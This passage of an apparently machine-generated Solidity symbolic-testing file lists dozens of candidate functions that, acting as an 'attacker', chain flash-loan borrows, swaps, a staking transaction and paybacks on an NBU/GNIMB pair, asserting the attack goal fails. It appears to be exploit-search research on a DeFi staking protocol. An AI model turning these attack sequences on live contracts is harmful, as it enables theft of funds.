        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5290(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5291(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5292(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5293(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5294(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5295(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5296(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5297(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5298(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5299(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5300(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5301(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5302(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5303(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5304(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5305(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5306(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5307(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5308(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5309(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5310(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5311(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5312(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5313(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5314(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5315(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5316(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5317(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5318(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5319(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5320(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5321(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5322(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5323(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5324(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5325(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5326(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5327(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5328(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5329(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5330(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5331(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5332(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5333(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5334(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
